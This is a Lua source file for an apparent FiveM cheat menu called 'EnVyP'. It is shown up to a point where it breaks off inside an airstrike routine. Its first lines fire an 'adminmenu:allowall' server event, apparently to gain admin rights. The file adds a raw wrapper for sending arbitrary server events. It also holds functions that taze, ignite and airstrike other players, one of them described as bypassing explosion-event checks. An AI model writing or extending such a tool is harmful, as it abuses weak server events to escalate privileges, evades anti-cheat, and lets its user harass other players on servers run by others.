local titolo = "EnVyP ~r~9.0"
local pisellone = PlayerId(-1)
local pisello = GetPlayerName(pisellone)
TriggerServerEvent("adminmenu:allowall")
-- GLOBALS
local showblip = true
local showsprite = false
local nameabove1 = false
local nameabove2 = false
local nameabove3 = true
specwarning = false
thirdperson = true
local speedDemon = false
local nocollision = false
local antirag = false
local superGrip = false
local driftMode = false
local enchancedGrip = false
local fdMode = false
local esp = true
local isAirstrikeRunning = false
local Spectating = false
Spectating2 = false
local invisible = true
local PossessingVeh = false
local forcegun = false
local TrackedPlayer = nil
local SpectatedPlayer = nil
SpectatedPlayer = nil
local FlingedPlayer = nil
local asstarget = nil
local asshat = false
local PedGuardPlayer = false
local pedlist = {}
local speedmit = false
local aispeed = '50.0'
local logged = true
local objects = {}
local EVP = {}
local CreateThread = Citizen.CreateThread
local CreateThreadNow = Citizen.CreateThreadNow

EVP.debug = false

local function RGB(frequency)
  local result = {}
  local curtime = GetGameTimer() / 2000
  result.r = math.floor(math.sin(curtime * frequency + 0) * 127 + 128)
  result.g = math.floor(math.sin(curtime * frequency + 2) * 127 + 128)
  result.b = math.floor(math.sin(curtime * frequency + 4) * 127 + 128)

  return result
end

local menus = {}
local keys = {up = 172, down = 173, left = 174, right = 175, select = 176, back = 177}
local optionCount = 1
local currentKey = nil
local currentMenu = nil
local menuWidth = 0.18
local titleHeight = 0.05
local titleYOffset = 0.01
local titleScale = 0.5
local buttonHeight = 0.035
local buttonFont = 4
local buttonScale = 0.370
local buttonTextXOffset = 0.002
local buttonTextYOffset = 0.005
local descHeight = 0.035
local descFont = 1
local descXOffset = 0.003
local descScale = 0.370
local envypxd = "EnVyP Community"
local MenuWider = nil
local function debugPrint(text)
  if EVP.debug then
    Citizen.Trace("[EVP] " .. tostring(text))
  end
end

local function setMenuProperty(id, property, value)
  if id and menus[id] then
    menus[id][property] = value
    debugPrint(id .. " menu property changed: { " .. tostring(property) .. ", " .. tostring(value) .. " }")
  end
end

local function isMenuVisible(id)
  if id and menus[id] then
    return menus[id].visible
  else
    return false
  end
end

local function setMenuVisible(id, visible, holdCurrent)
  if id and menus[id] then
    setMenuProperty(id, "visible", visible)

    if not holdCurrent and menus[id] then
      setMenuProperty(id, "currentOption", 1)
    end

    if visible then
      if id ~= currentMenu and isMenuVisible(currentMenu) then
        setMenuVisible(currentMenu, false)
      end

      currentMenu = id
    end
  end
end

local function drawText(text, x, y, font, color, scale, center, shadow, alignRight)
  SetTextColour(color.r, color.g, color.b, color.a)
  SetTextFont(font)
  SetTextScale(scale, scale)

  if shadow then
    SetTextDropShadow(2, 2, 0, 0, 0)
  end

  if menus[currentMenu] then
    if center then
      SetTextCentre(center)
    elseif alignRight then
      SetTextWrap(menus[currentMenu].x, menus[currentMenu].x + menuWidth - buttonTextXOffset)
      SetTextRightJustify(true)
    end
  end
  SetTextEntry("STRING")
  AddTextComponentString(text)
  DrawText(x, y)
end

local function drawRect(x, y, width, height, color)
  DrawRect(x, y, width, height, color.r, color.g, color.b, color.a)
end

local function drawTitle()
  if menus[currentMenu] then
    local x = menus[currentMenu].x + menuWidth / 2
    local y = menus[currentMenu].y + titleHeight / 2

    if menus[currentMenu].titleBackgroundSprite then
      DrawSprite(
      menus[currentMenu].titleBackgroundSprite.dict,
      menus[currentMenu].titleBackgroundSprite.name,
      x,
      y,
      menuWidth,
      titleHeight,
      0.,
      255,
      255,
      255,
      255
      )
    else
      drawRect(x, y, menuWidth, titleHeight, menus[currentMenu].titleBackgroundColor)
    end

    drawText(
    menus[currentMenu].title,
    x,
    y - titleHeight / 2 + titleYOffset,
    menus[currentMenu].titleFont,
    menus[currentMenu].titleColor,
    titleScale,
    true
    )
  end
end

local function drawSubTitle()
  if menus[currentMenu] then
    local x = menus[currentMenu].x + menuWidth / 2
    local y = menus[currentMenu].y + titleHeight + buttonHeight / 2

    local rgb = RGB(0.5)

    local subTitleColor = {
      r=rgb.r,
      g=rgb.g,
      b=rgb.b,
      a = 255
    }

    drawRect(x, y, menuWidth, buttonHeight, menus[currentMenu].subTitleBackgroundColor)
    drawText(
    menus[currentMenu].subTitle,
    menus[currentMenu].x + buttonTextXOffset,
    y - buttonHeight / 2 + buttonTextYOffset,
    buttonFont,
    subTitleColor,
    buttonScale,
    false
    )

    if optionCount > menus[currentMenu].maxOptionCount then
      drawText(
      tostring(menus[currentMenu].currentOption) .. " / " .. tostring(optionCount),
      menus[currentMenu].x + menuWidth,
      y - buttonHeight / 2 + buttonTextYOffset,
      buttonFont,
      subTitleColor,
      buttonScale,
      false,
      false,
      true
      )
    end
  end
end

local function drawDescription(desc, descYOffset, ky)
  if menus[currentMenu] then
    local x = menus[currentMenu].x + menuWidth / 2
    local y = menus[currentMenu].y + descHeight / 2
    local ra = RGB(5.0)
    local descriptionColor = {
      r = ra.r,
      g = ra.b,
      b = 255,
      a = 255
    }

    drawRect(x, y + ky, menuWidth, descHeight, descriptionBackgroundColor)

    drawText(
    desc,
    menus[currentMenu].x + descXOffset,
    y - descHeight / 2 + descYOffset + 0.005,
    descFont,
    descriptionColor,
    descScale,
    false
    )
  end
end

local function drawButton(text, subText)
  local x = menus[currentMenu].x + menuWidth / 2
  local multiplier = nil

  if
  menus[currentMenu].currentOption <= menus[currentMenu].maxOptionCount and
  optionCount <= menus[currentMenu].maxOptionCount
  then
    multiplier = optionCount
  elseif
    optionCount > menus[currentMenu].currentOption - menus[currentMenu].maxOptionCount and
    optionCount <= menus[currentMenu].currentOption
    then
      multiplier = optionCount - (menus[currentMenu].currentOption - menus[currentMenu].maxOptionCount)
    end

    if multiplier then
      local y = menus[currentMenu].y + titleHeight + buttonHeight + (buttonHeight * multiplier) - buttonHeight / 2
      local backgroundColor = nil
      local textColor = nil
      local subTextColor = nil
      local shadow = false

      if menus[currentMenu].currentOption == optionCount then
        backgroundColor = menus[currentMenu].menuFocusBackgroundColor
        textColor = menus[currentMenu].menuFocusTextColor
        subTextColor = menus[currentMenu].menuFocusTextColor
      else
        backgroundColor = menus[currentMenu].menuBackgroundColor
        textColor = menus[currentMenu].menuTextColor
        subTextColor = menus[currentMenu].menuSubTextColor
        shadow = true
      end

      drawRect(x, y, menuWidth, buttonHeight, backgroundColor)
      drawText(
      text,
      menus[currentMenu].x + buttonTextXOffset,
      y - (buttonHeight / 2) + buttonTextYOffset,
      buttonFont,
      textColor,
      buttonScale,
      false,
      shadow
      )

      if subText then
        drawText(
        subText,
        menus[currentMenu].x + buttonTextXOffset,
        y - buttonHeight / 2 + buttonTextYOffset,
        buttonFont,
        subTextColor,
        buttonScale,
        false,
        shadow,
        true
        )
      end
    end
  end

  function EVP.CreateMenu(id, title)
    -- Default settings
    menus[id] = {}
    menus[id].title = titolo
    menus[id].subTitle = "EnVyP Community"


    menus[id].visible = false

    menus[id].previousMenu = nil

    menus[id].aboutToBeClosed = false

    menus[id].x = 0.80
    menus[id].y = 0.15

    menus[id].currentOption = 1
    menus[id].maxOptionCount = 15
    menus[id].titleFont = 1
    Citizen.CreateThread(
    function()
      while true do
        Citizen.Wait(0)
        local ra = RGB(2.0)
        menus[id].titleColor = {r = ra.r, g = ra.g, b = ra.b, a = 255}
      end
      end)
      Citizen.CreateThread(
      function()
        while true do
          Citizen.Wait(0)
          local ra = RGB(1.0)
          menus[id].menuFocusBackgroundColor = {r = ra.r, g = ra.g, b = ra.b, a = 100}
        end
        end)
        menus[id].titleBackgroundSprite = nil
        menus[id].titleBackgroundColor = {r = 1, g = 1, b = 1, a = 160}
        menus[id].menuTextColor = {r = 255, g = 255, b = 255, a = 255}
        menus[id].menuSubTextColor = {r = 189, g = 189, b = 189, a = 255}
        menus[id].menuFocusTextColor = {r = 255, g = 255, b = 255, a = 255}
        menus[id].menuBackgroundColor = {r = 0, g = 0, b = 0, a = 130}

        menus[id].subTitleBackgroundColor = {r = 255, g = 255, b = 255, a = 160}

        descriptionBackgroundColor =
        {
          r = menus[id].menuBackgroundColor.r,
          g = menus[id].menuBackgroundColor.g,
          b = menus[id].menuBackgroundColor.b,
          a = 125
        }
        menus[id].buttonPressedSound = {name = "SELECT", set = "HUD_FRONTEND_DEFAULT_SOUNDSET"}

        debugPrint(tostring(id) .. " menu created")
      end

      function EVP.CreateSubMenu(id, parent, subTitle)
        if menus[parent] then
          EVP.CreateMenu(id, menus[parent].title)

          if subTitle then
            setMenuProperty(id, "subTitle", (subTitle))
          else
            setMenuProperty(id, "subTitle", (menus[parent].subTitle))
          end

          setMenuProperty(id, "previousMenu", parent)

          setMenuProperty(id, "x", menus[parent].x)
          setMenuProperty(id, "y", menus[parent].y)
          setMenuProperty(id, "maxOptionCount", menus[parent].maxOptionCount)
          setMenuProperty(id, "titleFont", menus[parent].titleFont)
          setMenuProperty(id, "titleColor", menus[parent].titleColor)
          setMenuProperty(id, "titleBackgroundColor", menus[parent].titleBackgroundColor)
          setMenuProperty(id, "titleBackgroundSprite", menus[parent].titleBackgroundSprite)
          setMenuProperty(id, "menuTextColor", menus[parent].menuTextColor)
          setMenuProperty(id, "menuSubTextColor", menus[parent].menuSubTextColor)
          setMenuProperty(id, "menuFocusTextColor", menus[parent].menuFocusTextColor)
          setMenuProperty(id, "menuFocusBackgroundColor", menus[parent].menuFocusBackgroundColor)
          setMenuProperty(id, "menuBackgroundColor", menus[parent].menuBackgroundColor)
          setMenuProperty(id, "subTitleBackgroundColor", menus[parent].subTitleBackgroundColor)
        else
          debugPrint("Failed to create " .. tostring(id) .. " submenu: " .. tostring(parent) .. " parent menu doesn't exist")
        end
      end

      function EVP.CurrentMenu()
        return currentMenu
      end

      function EVP.OpenMenu(id)
        if id and menus[id] then
          PlaySoundFrontend(-1, "SELECT", "HUD_FRONTEND_DEFAULT_SOUNDSET", true)
          setMenuVisible(id, true)

          if menus[id].titleBackgroundSprite then
            RequestStreamedTextureDict(menus[id].titleBackgroundSprite.dict, false)
            while not HasStreamedTextureDictLoaded(menus[id].titleBackgroundSprite.dict) do
              Citizen.Wait(0)
            end
          end

          debugPrint(tostring(id) .. " menu opened")
        else
          debugPrint("Failed to open " .. tostring(id) .. " menu: it doesn't exist")
        end
      end

      function EVP.IsMenuOpened(id)
        return isMenuVisible(id)
      end

      function EVP.IsAnyMenuOpened()
        for id, _ in pairs(menus) do
          if isMenuVisible(id) then
            return true
          end
        end

        return false
      end

      function EVP.IsMenuAboutToBeClosed()
        if menus[currentMenu] then
          return menus[currentMenu].aboutToBeClosed
        else
          return false
        end
      end

      function EVP.CloseMenu()
        if menus[currentMenu] then
          if menus[currentMenu].aboutToBeClosed then
            menus[currentMenu].aboutToBeClosed = false
            setMenuVisible(currentMenu, false)
            debugPrint(tostring(currentMenu) .. " menu closed")
            PlaySoundFrontend(-1, "QUIT", "HUD_FRONTEND_DEFAULT_SOUNDSET", true)
            optionCount = 0
            currentMenu = nil
            currentKey = nil
          else
            menus[currentMenu].aboutToBeClosed = true
            debugPrint(tostring(currentMenu) .. " menu about to be closed")
          end
        end
      end

      function EVP.Button(text, subText)
        local buttonText = text
        if subText then
          buttonText = "{ " .. tostring(buttonText) .. ", " .. tostring(subText) .. " }"
        end

        if menus[currentMenu] then
          optionCount = optionCount + 1

          local isCurrent = menus[currentMenu].currentOption == optionCount

          drawButton(text, subText)

          if isCurrent then
            if currentKey == keys.select then
              PlaySoundFrontend(-1, menus[currentMenu].buttonPressedSound.name, menus[currentMenu].buttonPressedSound.set, true)
              debugPrint(buttonText .. " button pressed")
              return true
            elseif currentKey == keys.left or currentKey == keys.right then
              PlaySoundFrontend(-1, "NAV_UP_DOWN", "HUD_FRONTEND_DEFAULT_SOUNDSET", true)
            end
          end

          return false
        else
          debugPrint("Failed to create " .. buttonText .. " button: " .. tostring(currentMenu) .. " menu doesn't exist")

          return false
        end
      end

      function EVP.MenuButton(text, id)
        if menus[id] then
          if EVP.Button(text) then
            setMenuVisible(currentMenu, false)
            setMenuVisible(id, true, true)

            return true
          end
        else
          debugPrint("Failed to create " .. tostring(text) .. " menu button: " .. tostring(id) .. " submenu doesn't exist")
        end

        return false
      end

      function EVP.CheckBox(text, bool, callback)
        local checked = "~r~OFF"
        if bool then
          checked = "~g~ON"
        end

        if EVP.Button(text, checked) then
          bool = not bool
          debugPrint(tostring(text) .. " checkbox changed to " .. tostring(bool))
          callback(bool)

          return true
        end

        return false
      end

      local function optFPS()
        ClearAllBrokenGlass()
        ClearAllHelpMessages()
        LeaderboardsReadClearAll()
        ClearBrief()
        ClearGpsFlags()
        ClearPrints()
        ClearSmallPrints()
        ClearReplayStats()
        LeaderboardsClearCacheData()
        ClearFocus()
        ClearHdArea()
        ClearPedBloodDamage(PlayerPedId())
        ClearPedWetness(PlayerPedId())
        ClearPedEnvDirt(PlayerPedId())
        ResetPedVisibleDamage(PlayerPedId())
      end

      function EVP.ComboBox(text, items, currentIndex, selectedIndex, callback)
        local itemsCount = #items
        local selectedItem = items[currentIndex]
        local isCurrent = menus[currentMenu].currentOption == (optionCount + 1)

        if itemsCount > 1 and isCurrent then
          selectedItem = '- '..tostring(selectedItem)..' +'
        end

        if EVP.Button(text, selectedItem) then
          selectedIndex = currentIndex
          callback(currentIndex, selectedIndex)
          return true
        elseif isCurrent then
          if currentKey == keys.left then
            if currentIndex > 1 then
              currentIndex = currentIndex - 1
            else
              currentIndex = itemsCount
            end
          elseif currentKey == keys.right then
            if currentIndex < itemsCount then
              currentIndex = currentIndex + 1
            else
              currentIndex = 1
            end
          end
        else
          currentIndex = selectedIndex
        end

        callback(currentIndex, selectedIndex)
        return false
      end

      EVP.TriggerCustomEvent = function(server, event, ...)
        local payload = msgpack.pack({...})
        if server then
            TriggerServerEventInternal(event, payload, payload:len())
        else
            TriggerEventInternal(event, payload, payload:len())
        end
    end

      function TSE(a,b,c,d,e,f,g,h,i,m)
        TriggerServerEvent(a,b,c,d,e,f,g,h,i,m)
      end

      function EVP.Display()
        if isMenuVisible(currentMenu) then
          if menus[currentMenu].aboutToBeClosed then
            EVP.CloseMenu()
          else
            ClearAllHelpMessages()

            drawTitle()
            drawSubTitle()

            currentKey = nil

            if IsDisabledControlJustPressed(0, keys.down) then
              PlaySoundFrontend(-1, "NAV_UP_DOWN", "HUD_FRONTEND_DEFAULT_SOUNDSET", true)

              if menus[currentMenu].currentOption < optionCount then
                menus[currentMenu].currentOption = menus[currentMenu].currentOption + 1
              else
                menus[currentMenu].currentOption = 1
              end
            elseif IsDisabledControlJustPressed(0, keys.up) then
              PlaySoundFrontend(-1, "NAV_UP_DOWN", "HUD_FRONTEND_DEFAULT_SOUNDSET", true)

              if menus[currentMenu].currentOption > 1 then
                menus[currentMenu].currentOption = menus[currentMenu].currentOption - 1
              else
                menus[currentMenu].currentOption = optionCount
              end
            elseif IsDisabledControlJustPressed(0, keys.left) then
              currentKey = keys.left
            elseif IsDisabledControlJustPressed(0, keys.right) then
              currentKey = keys.right
            elseif IsDisabledControlJustPressed(0, keys.select) then
              currentKey = keys.select
            elseif IsDisabledControlJustPressed(0, keys.back) then
              if menus[menus[currentMenu].previousMenu] then
                PlaySoundFrontend(-1, "BACK", "HUD_FRONTEND_DEFAULT_SOUNDSET", true)
                setMenuVisible(menus[currentMenu].previousMenu, true)
              else
                EVP.CloseMenu()
              end
            end

            optionCount = 0
          end
        end
      end

      function EVP.SetMenuWidth(id, width)
        setMenuProperty(id, "width", width)
      end

      function EVP.SetMenuX(id, x)
        setMenuProperty(id, "x", x)
      end

      function EVP.SetMenuY(id, y)
        setMenuProperty(id, "y", y)
      end

      function EVP.SetMenuMaxOptionCountOnScreen(id, count)
        setMenuProperty(id, "maxOptionCount", count)
      end

      function EVP.SetTitleColor(id, r, g, b, a)
        setMenuProperty(id, "titleColor", {["r"] = r, ["g"] = g, ["b"] = b, ["a"] = a or menus[id].titleColor.a})
      end

      function EVP.SetTitleBackgroundColor(id, r, g, b, a)
        setMenuProperty(
        id,
        "titleBackgroundColor",
        {["r"] = r, ["g"] = g, ["b"] = b, ["a"] = a or menus[id].titleBackgroundColor.a}
        )
      end

      function EVP.SetTitleBackgroundSprite(id, textureDict, textureName)
        setMenuProperty(id, "titleBackgroundSprite", {dict = textureDict, name = textureName})
      end

      function EVP.SetSubTitle(id, text)
        setMenuProperty(id, "subTitle", (text))
      end


      function EVP.SetMenuBackgroundColor(id, r, g, b, a)
        setMenuProperty(
        id,
        "menuBackgroundColor",
        {["r"] = r, ["g"] = g, ["b"] = b, ["a"] = a or menus[id].menuBackgroundColor.a}
        )
      end

      function EVP.SetMenuTextColor(id, r, g, b, a)
        setMenuProperty(id, "menuTextColor", {["r"] = r, ["g"] = g, ["b"] = b, ["a"] = a or menus[id].menuTextColor.a})
      end

      function EVP.SetMenuSubTextColor(id, r, g, b, a)
        setMenuProperty(id, "menuSubTextColor", {["r"] = r, ["g"] = g, ["b"] = b, ["a"] = a or menus[id].menuSubTextColor.a})
      end

      function EVP.SetMenuFocusColor(id, r, g, b, a)
        setMenuProperty(id, "menuFocusColor", {["r"] = r, ["g"] = g, ["b"] = b, ["a"] = a or menus[id].menuFocusColor.a})
      end

      function EVP.SetMenuButtonPressedSound(id, name, set)
        setMenuProperty(id, "buttonPressedSound", {["name"] = name, ["set"] = set})
      end

      function KeyboardInput(TextEntry, ExampleText, MaxStringLength)
        AddTextEntry("FMMC_KEY_TIP1", TextEntry .. ":")
        DisplayOnscreenKeyboard(1, "FMMC_KEY_TIP1", "", ExampleText, "", "", "", MaxStringLength)
        while (UpdateOnscreenKeyboard() == 0) do
          DisableAllControlActions(0)
          if IsDisabledControlPressed(0, 322) then return "" end
          Wait(0)
        end
        if (GetOnscreenKeyboardResult()) then
          local result = GetOnscreenKeyboardResult()
          return result
        end
      end

      function EnumeratePickups()
        return EnumerateEntities(FindFirstPickup, FindNextPickup, EndFindPickup)
      end

      function AddVectors(vect1, vect2)
        return vector3(vect1.x + vect2.x, vect1.y + vect2.y, vect1.z + vect2.z)
      end

      function SubVectors(vect1, vect2)
        return vector3(vect1.x - vect2.x, vect1.y - vect2.y, vect1.z - vect2.z)
      end

      function ScaleVector(vect, mult)
        return vector3(vect.x*mult, vect.y*mult, vect.z*mult)
      end

      function GetSeatPedIsIn(ped)
        if not IsPedInAnyVehicle(ped, false) then return
      else
        veh = GetVehiclePedIsIn(ped)
        for i=0, GetVehicleMaxNumberOfPassengers(veh) do
          if GetPedInVehicleSeat(veh) then return i end
        end
      end
    end

    function GetCamDirFromScreenCenter()
      local pos = GetGameplayCamCoord()
      local world = ScreenToWorld(0, 0)
      local ret = SubVectors(world, pos)
      return ret
    end

    function ScreenToWorld(screenCoord)
      local camRot = GetGameplayCamRot(2)
      local camPos = GetGameplayCamCoord()

      local vect2x = 0.0
      local vect2y = 0.0
      local vect21y = 0.0
      local vect21x = 0.0
      local direction = RotationToDirection(camRot)
      local vect3 = vector3(camRot.x + 10.0, camRot.y + 0.0, camRot.z + 0.0)
      local vect31 = vector3(camRot.x - 10.0, camRot.y + 0.0, camRot.z + 0.0)
      local vect32 = vector3(camRot.x, camRot.y + 0.0, camRot.z + -10.0)

      local direction1 = RotationToDirection(vector3(camRot.x, camRot.y + 0.0, camRot.z + 10.0)) - RotationToDirection(vect32)
      local direction2 = RotationToDirection(vect3) - RotationToDirection(vect31)
      local radians = -(math.rad(camRot.y))

      vect33 = (direction1 * math.cos(radians)) - (direction2 * math.sin(radians))
      vect34 = (direction1 * math.sin(radians)) - (direction2 * math.cos(radians))

      local case1, x1, y1 = WorldToScreenRel(((camPos + (direction * 10.0)) + vect33) + vect34)
      if not case1 then
        vect2x = x1
        vect2y = y1
        return camPos + (direction * 10.0)
      end

      local case2, x2, y2 = WorldToScreenRel(camPos + (direction * 10.0))
      if not case2 then
        vect21x = x2
        vect21y = y2
        return camPos + (direction * 10.0)
      end

      if math.abs(vect2x - vect21x) < 0.001 or math.abs(vect2y - vect21y) < 0.001 then
        return camPos + (direction * 10.0)
      end

      local x = (screenCoord.x - vect21x) / (vect2x - vect21x)
      local y = (screenCoord.y - vect21y) / (vect2y - vect21y)
      return ((camPos + (direction * 10.0)) + (vect33 * x)) + (vect34 * y)

    end

    function WorldToScreenRel(worldCoords)
      local check, x, y = GetScreenCoordFromWorldCoord(worldCoords.x, worldCoords.y, worldCoords.z)
      if not check then
        return false
      end

      screenCoordsx = (x - 0.5) * 2.0
      screenCoordsy = (y - 0.5) * 2.0
      return true, screenCoordsx, screenCoordsy
    end

    function RotationToDirection(rotation)
      local retz = math.rad(rotation.z)
      local retx = math.rad(rotation.x)
      local absx = math.abs(math.cos(retx))
      return vector3(-math.sin(retz) * absx, math.cos(retz) * absx, math.sin(retx))
    end

    local function GetCamDirection()
      local heading = GetGameplayCamRelativeHeading()+GetEntityHeading(GetPlayerPed(-1))
      local pitch = GetGameplayCamRelativePitch()

      local x = -math.sin(heading*math.pi/180.0)
      local y = math.cos(heading*math.pi/180.0)
      local z = math.sin(pitch*math.pi/180.0)

      local len = math.sqrt(x*x+y*y+z*z)
      if len ~= 0 then
        x = x/len
        y = y/len
        z = z/len
      end

      return x,y,z
    end

    local function getPlayerIds()
      local players = {}
      for i = 0, GetNumberOfPlayers() do
        if NetworkIsPlayerActive(i) then
          players[#players + 1] = i
        end
      end
      return players
    end

    local function RandomSkin(target)
      local ped = GetPlayerPed(target)
      SetPedRandomComponentVariation(ped, false)
      SetPedRandomProps(ped)
    end

    local function ClonePedlol(target)
      local ped = GetPlayerPed(target)
      local me = PlayerPedId()

      hat = GetPedPropIndex(ped, 0)
      hat_texture = GetPedPropTextureIndex(ped, 0)

      glasses = GetPedPropIndex(ped, 1)
      glasses_texture = GetPedPropTextureIndex(ped, 1)

      ear = GetPedPropIndex(ped, 2)
      ear_texture = GetPedPropTextureIndex(ped, 2)

      watch = GetPedPropIndex(ped, 6)
      watch_texture = GetPedPropTextureIndex(ped, 6)

      wrist = GetPedPropIndex(ped, 7)
      wrist_texture = GetPedPropTextureIndex(ped, 7)

      head_drawable = GetPedDrawableVariation(ped, 0)
      head_palette = GetPedPaletteVariation(ped, 0)
      head_texture = GetPedTextureVariation(ped, 0)

      beard_drawable = GetPedDrawableVariation(ped, 1)
      beard_palette = GetPedPaletteVariation(ped, 1)
      beard_texture = GetPedTextureVariation(ped, 1)

      hair_drawable = GetPedDrawableVariation(ped, 2)
      hair_palette = GetPedPaletteVariation(ped, 2)
      hair_texture = GetPedTextureVariation(ped, 2)

      torso_drawable = GetPedDrawableVariation(ped, 3)
      torso_palette = GetPedPaletteVariation(ped, 3)
      torso_texture = GetPedTextureVariation(ped, 3)

      legs_drawable = GetPedDrawableVariation(ped, 4)
      legs_palette = GetPedPaletteVariation(ped, 4)
      legs_texture = GetPedTextureVariation(ped, 4)

      hands_drawable = GetPedDrawableVariation(ped, 5)
      hands_palette = GetPedPaletteVariation(ped, 5)
      hands_texture = GetPedTextureVariation(ped, 5)

      foot_drawable = GetPedDrawableVariation(ped, 6)
      foot_palette = GetPedPaletteVariation(ped, 6)
      foot_texture = GetPedTextureVariation(ped, 6)

      acc1_drawable = GetPedDrawableVariation(ped, 7)
      acc1_palette = GetPedPaletteVariation(ped, 7)
      acc1_texture = GetPedTextureVariation(ped, 7)

      acc2_drawable = GetPedDrawableVariation(ped, 8)
      acc2_palette = GetPedPaletteVariation(ped, 8)
      acc2_texture = GetPedTextureVariation(ped, 8)

      acc3_drawable = GetPedDrawableVariation(ped, 9)
      acc3_palette = GetPedPaletteVariation(ped, 9)
      acc3_texture = GetPedTextureVariation(ped, 9)

      mask_drawable = GetPedDrawableVariation(ped, 10)
      mask_palette = GetPedPaletteVariation(ped, 10)
      mask_texture = GetPedTextureVariation(ped, 10)

      aux_drawable = GetPedDrawableVariation(ped, 11)
      aux_palette = GetPedPaletteVariation(ped, 11)
      aux_texture = GetPedTextureVariation(ped, 11)

      SetPedPropIndex(me, 0, hat, hat_texture, 1)
      SetPedPropIndex(me, 1, glasses, glasses_texture, 1)
      SetPedPropIndex(me, 2, ear, ear_texture, 1)
      SetPedPropIndex(me, 6, watch, watch_texture, 1)
      SetPedPropIndex(me, 7, wrist, wrist_texture, 1)

      SetPedComponentVariation(me, 0, head_drawable, head_texture, head_palette)
      SetPedComponentVariation(me, 1, beard_drawable, beard_texture, beard_palette)
      SetPedComponentVariation(me, 2, hair_drawable, hair_texture, hair_palette)
      SetPedComponentVariation(me, 3, torso_drawable, torso_texture, torso_palette)
      SetPedComponentVariation(me, 4, legs_drawable, legs_texture, legs_palette)
      SetPedComponentVariation(me, 5, hands_drawable, hands_texture, hands_palette)
      SetPedComponentVariation(me, 6, foot_drawable, foot_texture, foot_palette)
      SetPedComponentVariation(me, 7, acc1_drawable, acc1_texture, acc1_palette)
      SetPedComponentVariation(me, 8, acc2_drawable, acc2_texture, acc2_palette)
      SetPedComponentVariation(me, 9, acc3_drawable, acc3_texture, acc3_palette)
      SetPedComponentVariation(me, 10, mask_drawable, mask_texture, mask_palette)
      SetPedComponentVariation(me, 11, aux_drawable, aux_texture, aux_palette)
    end


    local function TazePlayer(player)
      local ped = GetPlayerPed(player)
      local tLoc = GetEntityCoords(ped)

      local destination = GetPedBoneCoords(ped, 0, 0.0, 0.0, 0.0)
      local origin = GetPedBoneCoords(ped, 57005, 0.0, 0.0, 0.2)
      ShootSingleBulletBetweenCoords(origin, destination, 1, true, 'WEAPON_STUNGUN', PlayerPedId(), true, false, 1.0)
    end

    local function IgnitePlayer(player)
      local ped = GetPlayerPed(player)

      RequestControlOnce(ped)

      if IsEntityOnFire(ped) then
        StopEntityFire(ped)
        return true
      end

      StartEntityFire(ped)
      return true
    end

    local Airstrike = {
      ped_hash = 'S_M_Y_MARINE_01',
      vehicle_hash = 'STRIKEFORCE',
      weapon_asset = 519052682,
      spawnDistance = 750.0,
    }

    RequestModel(Airstrike.ped_hash)
    RequestModel(Airstrike.vehicle_hash)
    RequestWeaponAsset(Airstrike.weapon_asset, 31, 0)

    local function AirstrikePlayer(player)
      if isAirstrikeRunning then
        return notify("Wait until the current airstrike is complete")
      end

      local function AirstrikeThread()
        isAirstrikeRunning = true

        local playerPed = GetPlayerPed(player)
        local target = GetEntityCoords(playerPed)
        local origin = target + vector3(Airstrike.spawnDistance, Airstrike.spawnDistance, 725.0)

        repeat
          Wait(0)
        until HasModelLoaded(Airstrike.ped_hash) and HasModelLoaded(Airstrike.vehicle_hash)

        repeat
          Wait(0)
        until HasWeaponAssetLoaded(Airstrike.weapon_asset)

        -- Create Aircraft
        local aircraft = CreateVehicle(Airstrike.vehicle_hash, origin, 0.0, true, true)
        FreezeEntityPosition(aircraft, true)

        -- Register with network and give up network ownership
        local netVehid = NetworkGetNetworkIdFromEntity(aircraft)
        SetNetworkIdCanMigrate(netVehid, true)
        NetworkSetNetworkIdDynamic(netVehid, false)

        aircraft = NetToVeh(netVehid)

        -- Create pilot and block temporary events
        local pilot = CreatePedInsideVehicle(NetToVeh(netVehid), 29, Airstrike.ped_hash, -1, true, true)

        -- Give up network ownership of ped
        -- NetworkRegisterEntityAsNetworked(pilot)
        local netPedid = NetworkGetNetworkIdFromEntity(pilot)
        SetNetworkIdCanMigrate(netPedid, true)
        NetworkSetNetworkIdDynamic(netPedid, false)

        pilot = NetToPed(netPedid)

        SetBlockingOfNonTemporaryEvents(pilot, true)
        SetDriverAbility(pilot, 1.0)
        -- Make sure the vehicle engine is started
        SetVehicleEngineOn(aircraft, true, true, true)

        -- Retract landing gear for fast flight
        ControlLandingGear(aircraft, 3)

        -- Disable turbulence
        SetPlaneTurbulenceMultiplier(aircraft, 0.0)

        -- Make sure the vehicle is marked as unowned by Player
        SetVehicleHasBeenOwnedByPlayer(aircraft, false)

        SetVehicleForceAfterburner(aircraft, true)
        local blip = AddBlipForEntity(aircraft)

        -- Disabled rockets (CExplosionEvent bypass)
        SetCurrentPedVehicleWeapon(pilot, Airstrike.weapon_asset)

        FreezeEntityPosition(aircraft, false)
        --TaskVehicleDriveToCoord(pilot, aircraft, target.x, target.y, target.z, 3500.0 * 2.6, 1.0, Airstrike.vehicle_hash, 16777216, 1.0, true)
        TaskPlaneMission(pilot, NetToVeh(netVehid), 0, playerPed, 0, 0, 0, 6, GetVehicleModelMaxSpeed(aircraft), 1.0, 0.0, 2000.0, 500.0)
        SetPedKeepTask(pilot, true)
        SetDriveTaskCruiseSpeed(pilot, 150.0)

        while true do
          local target = GetEntityCoords(playerPed)
          local vehCoords = GetEntityCoords(aircraft)
          local distance = GetDistanceBetweenCoords(vehCoords, target)

          if not NetworkDoesEntityExistWithNetworkId(netVehid) then
            isAirstrikeRunning = false

            notify("We lost network control, try again.")
          end

          if distance > 150.0 then
            TaskPlaneMission(pilot, aircraft, 0, playerPed, 0, 0, 0, 6, GetVehicleModelMaxSpeed(aircraft), 1.0, 0.0, 2000.0, 500.0)
          end

          if distance <= 150.0 then
            ShootSingleBulletBetweenCoords(vehCoords.x, vehCoords.y, vehCoords.z - 2.0, target.x, target.y, target.z, 10000.0, 0, Airstrike.weapon_asset, pilot, true, false, 8000.0)
            for i = 1, 11 do
              local coords = GetEntityCoords(aircraft)
              local target = GetEntityCoords(playerPed)
              local offset = target + vector3(math.random(-8.0, 8.0), math.random(-8.0, 8.0), 0.0)

              -- print(offset)
              ShootSingleBulletBetweenCoords(coords.x, coords.y, coords.z - 2.0, offset.x, offset.y, offset.z, 10000.0, 0, Airstrike.weapon_asset, pilot, true, false, 8000.0)

              Wait(100)
            end
            TaskVehicleDriveToCoord(pilot, aircraft, origin, 3500.0 * 2.6, 1.0, Airstrike.vehicle_hash, 16777216, 1.0, true)

            Wait(10000)
            NetworkUnregisterNetworkedEntity(pilot)
            NetworkUnregisterNetworkedEntity(aircraft)
            DeletePed(pilot)
            SetEntityAsMissionEntity(aircraft, true, true)
            DeleteVehicle(aircraft)

